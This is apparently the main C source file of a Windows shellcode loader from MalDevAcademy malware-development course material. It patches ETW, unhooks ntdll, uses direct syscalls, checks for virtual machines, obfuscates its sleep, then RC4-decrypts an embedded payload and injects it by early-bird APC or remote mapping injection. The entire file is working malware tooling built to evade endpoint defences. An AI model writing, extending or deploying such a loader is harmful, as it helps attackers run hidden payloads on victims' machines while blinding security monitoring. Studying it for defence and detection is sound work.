// @NUL0x4C | @mrd0x : MalDevAcademy
#include "loader_config.h"

#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "IatCamouflage.h"
#include "Debug.h"

// suppresses CRT linker requirement for floating-point
float _fltused = 0;

int main() {

	DWORD	dwProcessId = 0;
	HANDLE	hProcess    = NULL;

	IatCamouflage();

#ifdef ETW_PATCH
	if (!PatchEtw()) {
#ifdef DEBUG
		PRINTA("[!] ETW Patch Failed\n");
#endif
		return -1;
	}
#endif

#ifdef UNHOOK_DISK
	if (!UnhookNtdll()) {
#ifdef DEBUG
		PRINTA("[!] Ntdll Unhook Failed\n");
#endif
		return -1;
	}
#endif

	if (!InitializeSyscalls()) {
#ifdef DEBUG
		PRINTA("[!] Failed To Initialize Syscalls Structure \n");
#endif
		return -1;
	}

#ifdef ANTI_ANALYSIS
	if (!AntiAnalysis(MONITOR_TIME)) {
#ifdef DEBUG
		PRINTA("[!] Detected A Virtualized Environment \n");
#endif
	}
#endif

#ifdef SLEEP_OBF
	EkkoSleep(SLEEP_MS);
#endif

#ifdef INJECT_EARLY_BIRD
	if (!Rc4DecryptPayload(Rc4CipherText, PAYLOAD_SIZE)) {
#ifdef DEBUG
		PRINTA("[!] RC4 Decrypt Failed\n");
#endif
		return -1;
	}
	if (!EarlyBirdInject(Rc4CipherText, PAYLOAD_SIZE)) {
#ifdef DEBUG
		PRINTA("[!] Early Bird Inject Failed\n");
#endif
		return -1;
	}
#else
#ifdef TARGET_PROCESS
#ifdef DEBUG
	PRINTW(L"[i] Targeting Remote Process %s ...\n", TARGET_PROCESS);
#endif
	if (!GetRemoteProcessHandle(TARGET_PROCESS, &dwProcessId, &hProcess)) {
#ifdef DEBUG
		PRINTA("[!] Could Not Find Target Process\n");
#endif
		return -1;
	}
#ifdef DEBUG
	PRINTA("[+] PID : %d\n", dwProcessId);
#endif
	if (!RemoteMappingInjectionViaSyscalls(hProcess, Rc4CipherText, PAYLOAD_SIZE, FALSE)) {
#ifdef DEBUG
		PRINTA("[!] Injection Failed\n");
#endif
		return -1;
	}
#endif

#ifndef TARGET_PROCESS
	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, Rc4CipherText, PAYLOAD_SIZE, TRUE)) {
#ifdef DEBUG
		PRINTA("[!] Injection Failed\n");
#endif
		return -1;
	}
#endif
#endif // INJECT_EARLY_BIRD

	return 0;
}
